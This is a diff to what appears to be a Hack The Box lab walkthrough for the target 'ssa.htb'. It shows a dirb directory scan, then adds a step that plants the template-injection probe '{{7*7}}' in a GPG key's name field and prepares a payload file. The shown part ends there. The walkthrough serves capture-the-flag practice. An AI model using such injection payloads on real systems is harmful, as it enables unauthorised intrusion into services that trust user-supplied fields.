@@ -20,3 +20,18 @@ $ sudo dirb https://ssa.htb
 
 Then open https://ssa.htb/admin in Browser
 
+# Step 4:
+
+$ gpg --gen-key      // Generating Public Key
+Real Name: {{7*7}}
+Email: a@a.com
+
+$ gpg --armor --export a@a.com > Public_Key.asc    //Exporting the Generated Public Key
+
+## Making Payload Text File
+
+$ echo "Test" > Payload.txt
+
+
+
+
